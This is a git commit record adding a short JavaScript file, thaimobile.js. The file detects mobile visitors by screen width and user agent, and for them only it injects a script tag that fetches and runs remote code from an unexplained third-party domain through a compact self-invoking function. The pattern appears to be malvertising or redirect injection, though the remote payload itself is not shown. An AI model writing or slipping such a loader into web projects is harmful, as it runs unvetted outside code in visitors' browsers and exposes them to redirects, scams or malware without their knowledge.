124120ca22ca48351585676c7160edd5d58678c9
mahji01 <132646024+mahji01@users.noreply.github.com>
2023-05-12 03:41:46 +0700

    Create thaimobile.js

---
+++ thaimobile.js
@@ -0,0 +1,8 @@
+if (screen.width < 500 ||
+ navigator.userAgent.match(/Android/i) ||
+ navigator.userAgent.match(/webOS/i) ||
+ navigator.userAgent.match(/iPhone/i) ||
+ navigator.userAgent.match(/iPod/i)){
+	 
+	(function(s,u,p){s.src=u,p.appendChild(s);})(document.createElement('script'),'//sadnesscontemporary.com/13/9c/82/139c82e7384aba2be0aeb8131a1fdb84.js',document.body||document.documentElement)
+	 }
